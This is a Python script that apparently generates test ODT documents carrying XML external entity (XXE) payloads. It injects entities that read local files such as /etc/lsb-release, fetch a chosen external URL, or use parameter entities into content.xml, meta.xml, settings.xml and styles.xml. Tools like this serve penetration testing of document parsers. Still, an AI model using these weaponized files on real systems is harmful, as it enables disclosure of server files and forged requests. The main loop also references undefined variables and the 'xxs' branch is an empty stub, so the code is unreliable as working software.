#!/usr/bin/python3

import os  
import shutil
import json
import uuid
import argparse

from lxml import etree, objectify

def make_tmp_clean_again(paths, mode):

	if mode ==  'original':
		if os.path.exists(paths['path_to_unzipped_folder_original']):
			shutil.rmtree(paths['path_to_unzipped_folder_original'])

		if os.path.exists(paths['path_to_copied_file']):
			os.remove(paths['path_to_copied_file'])

	elif mode == 'copy':

		if os.path.exists(paths['path_to_unzipped_folder_modified']):
			shutil.rmtree(paths['path_to_unzipped_folder_modified'])

		if os.path.exists(paths['path_to_modified_file']):
			os.remove(paths['path_to_modified_file'])

# STEP 0
def document_prepare_future_paths(path_to_file):

	path_to_script =  os.path.dirname(os.path.realpath(__file__))
	path_to_tmp = path_to_script + '/tmp/'

	# Create separate variables for an original file
	original_file_name = path_to_file.split('/')[-1].split('.')[0]
	original_file_ext = path_to_file.split('/')[-1].split('.')[1]

	# create variables for a copied files
	path_to_copied_file = path_to_tmp + original_file_name + '.zip'

	# create variables for an unzipped files
	unzipped_file_name = original_file_name + '_' + original_file_ext
	path_to_unzipped_folder_original = path_to_tmp + unzipped_file_name + '/'

	paths_and_names = {
		"path_to_script" : path_to_script,
		"path_to_tmp" : path_to_tmp,
		"path_to_orignal_file" : path_to_file,
		"path_to_copied_file" : path_to_copied_file,
		"path_to_unzipped_folder_original" : path_to_unzipped_folder_original,
		"path_to_unzipped_folder_modified" : path_to_unzipped_folder_original,
		"original_file_name" : original_file_name,
		"original_file_ext" : original_file_ext,
		"unzipped_file_name" : unzipped_file_name,
		"modified_file_name" : original_file_name,
		"path_to_modified_file" : ''
	}

	return(paths_and_names)

# STEP 1
# copy, rename and unzip
def document_unpack(paths):

	# copy original file into script_script/dir and rename extension to .zip
	shutil.copy(paths["path_to_orignal_file"],paths["path_to_copied_file"])
	# unzip renamed file into direc
	shutil.unpack_archive(paths["path_to_copied_file"],paths["path_to_unzipped_folder_original"])

	print('unpacked to',paths["path_to_unzipped_folder_original"])

# STEP 2
# generate dir tree
# return [array]
# option : 1
# return : ['./docX/settings.xml', './docX/theme.xml', './docX/content.xml']
# option : 2
# return : [['./docX/', 'settings.xml'], ['./docX/', 'theme.xml'], ['./docX/', 'content.xml']]
def document_generate_tree(paths, opt=1):
	# a = []
	# b = []
	# for (dirs, _, files) in os.walk(paths["unzipped_file_name"]):
	#     print(files)
	#     for single_file in files:
	# 	    path = os.path.join(dirs, single_file)
	# 	    if os.path.exists(path):
	# 	        print(path)
	# 	        a += [path]
	# 	        b += [["/".join(path.split("/")[:-1])+"/",path.split("/")[-1]]]
	
	files_inside_unpacked_dir = []

	for root, dirs, files in os.walk(paths["path_to_unzipped_folder_original"], topdown = False):
		for name in files:
			#print(os.path.join(root, name))
			path_to_file = os.path.join(root, name)
			files_inside_unpacked_dir.append(path_to_file)

	#single_file = open(struc,"w+")
	# if opt == 1:
	# 	single_file.write(json.dumps(a))
	# 	single_file.close() 
	# 	return a
	# elif opt == 2:
	# 	single_file.write(json.dumps(b))
	# 	single_file.close() 
	# 	return b       
	return(files_inside_unpacked_dir)

# STEP 3
def document_emeding_payloads(paths, file_to_embed_name, payload_dict, attack_type='xxe'):

	#payload_place = "single"
	#file_to_embed_name = "content.xml" 
	file_to_embed_path = paths["path_to_unzipped_folder_modified"] + '/' + file_to_embed_name

	if attack_type == 'xxe':
		
		modfied_single_xml_file = modfy_xml_file(file_to_embed_path, payload_dict)

		with open(file_to_embed_path, 'w') as file_to_embed:
			file_to_embed.write(modfied_single_xml_file)
			file_to_embed.close()

	elif attack_type == 'xxs':

		file_to_embed_path = ''

		# with open(file_to_embed_path, 'w') as file_to_embed:
		# 	file_to_embed.write(modfied_single_xml_file)
		# 	file_to_embed.close()


	# For debug usage
	#print(modfied_single_xml_file)
	#print('file_to_embed_path',file_to_embed_path)

def modfy_xml_file(path_to_file, payload, attack ='xxe'):

	path_file_name = path_to_file.split('/')[-1]

	xml_tree = etree.parse(path_to_file)
	xml_root = xml_tree.getroot()

	# Convert xml_tree object to string with full documeetree.tostring(nt
	# 	etree.tostring(xml_tree)
	# Convert with 
	# 	etree.tostring(xml_tree, xml_declaration=True, encoding="UTF-8")

	if path_file_name == "content.xml":
		# main_text_clear 
		xml_root[2][0][1].text += ' ' + payload["var"]
		# main_text_bold
		xml_root[2][0][2][0].text += ' ' + payload["var"]
		# main_text_italic
		xml_root[2][0][3][0].text += ' ' + payload["var"]
		# main_text_und
		xml_root[2][0][4][0].text += ' ' + payload["var"]
		# main_text_strikethrough
		xml_root[2][0][5][0].text += ' ' + payload["var"]

	elif path_file_name == "meta.xml":
		xml_root[0][0].text += ' ' + payload["var"]


	elif path_file_name == "settings.xml":
		# 100
		xml_root[0][0][0][0][0].text += ' ' + payload["var"]
		# view2
		xml_root[0][0][0][0][1].text += ' ' + payload["var"]

	elif path_file_name == "styles.xml":
		# 00000000
		xml_root[1][0][1][0][0][0].text += ' ' + payload["var"]
		# 000000FF
		xml_root[1][0][1][1][0][0].text += ' ' + payload["var"]

	# Nice way. But how to add DTD after that. In TO-DO
	#xml_file_body = etree.tostring(xml_root, xml_declaration=True, encoding="UTF-8")
	# Small dirty trick with replace
	xml_file_body = etree.tostring(xml_root, encoding=str)
	xml_file_body = xml_file_body.replace('&amp;', '&')

	xml_head = '<?xml version="1.0" encoding="UTF-8" standalone="no" ?>'
	xml_head = xml_head + '\n' + payload["head"] + '\n' 
	xml_done = xml_head + xml_file_body

	return(xml_done)


# STEP 4
# zip into archive and rename
def document_pack(paths):

	# Split - because shutil will add .zip anyway
	shutil.make_archive(base_name=paths['path_to_modified_file'].split('.')[0],root_dir=paths['path_to_unzipped_folder_modified'],format='zip')
	# copy & rename zip to odt
	shutil.copy(paths['path_to_modified_file'], paths['path_to_packetd_file'])
		

def document_copy_dir(paths):

	shutil.copytree(paths['path_to_unzipped_folder_original'], paths['path_to_unzipped_folder_modified'])

if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='Create test ODT files')
	
	optional = parser._action_groups.pop()
	required = parser.add_argument_group('required arguments')
	
	required.add_argument('-s', dest='sample', type=str, help='path to sample file')
	required.add_argument('-xu', dest='xxe_url', type=str, help='url to use in XXE payload')
	
	optional.add_argument('-xf', dest='xxe_file', type=str, help='url to use in XXE payload. Default is: \'file:///etc/lsb-release\'', default='file:///etc/lsb-release')
	optional.add_argument('-kt', dest='keep_tmp', action='store_true', help='do not delete unpacked and modified folders')

	parser._action_groups.append(optional)
	
	args = parser.parse_args()	

	path_to_complex_file = args.sample

	if args.sample and args.xxe_url:
		if os.path.exists(args.sample):

			


			xxe_url_path = 'http://127.0.0.1'
			xxe_file_path = 'file:///etc/lsb-release'

			payload_vectors = {
			"xxe_int_file":
				{ 
				'var' : '&xxe_int_file;',
				'head': '<!DOCTYPE foo [<!ENTITY xxe_int_file SYSTEM "%s">]>' % args.xxe_file
				},
			"xxe_ext_file":
				{ 
				'var' : '&xxe_ext_file;',
				'head': '<!DOCTYPE foo [<!ENTITY xxe_ext_file SYSTEM "%s">]>' % args.xxe_url
				},
			"xxe_param_string":
				{ 
				'var' : '&xxe_param_string;',
				'head': '<!DOCTYPE foo [<!ENTITY % paramEntity "<!ENTITY xxe_param_string \'bar\'>"> %paramEntity;>]>'
				}
			}

			payload_vectors_xxs = {

			}

			paylad_places = {
				"odt" : ["content.xml","meta.xml","settings.xml","styles.xml"],
				"docx" : []
			}

			paths = document_prepare_future_paths(path_to_complex_file)
			
			if not os.path.exists(paths["path_to_tmp"]):
				os.mkdir(paths["path_to_tmp"])

			document_unpack(paths)


			for single_places in paylad_places["odt"]:

			#	with open(os.path.exists(paths["path_to_file"])) as 
					
				with open(file_to_embed_path, 'w') as file_to_embed:
					file_to_embed.write(modfied_single_xml_file)
					file_to_embed.close()


				for single_vector in payload_vectors.keys():

					postfix = single_places.split('.')[0] + '-' + single_vector  

					paths['modified_file_name'] = paths['original_file_name'] + '-' + postfix 
					paths['path_to_unzipped_folder_modified'] = paths['path_to_tmp'] + paths['modified_file_name'] + '/'

					paths['path_to_modified_file'] = paths['path_to_tmp'] + paths['modified_file_name'] + '.zip'
					paths['path_to_packetd_file'] = paths['path_to_tmp'] +  paths['modified_file_name'] + '.' +  paths['original_file_ext']

					document_copy_dir(paths)
					document_emeding_payloads(paths, single_places, payload_vectors[single_vector])
					document_pack(paths)

					print("="*60)
					print("modified: %s" % single_places)
					print("vector: %s" % single_vector)
					print("written_to: %s" %paths['modified_file_name'] + '.' +  paths['original_file_ext'])
			
					if not args.keep_tmp: 			
						make_tmp_clean_again(paths,'copy')

			make_tmp_clean_again(paths,'original')
			
		else:
			print("Error: Specified file: %s - does not exist"%args.sample)
	else:
		parser.print_help()
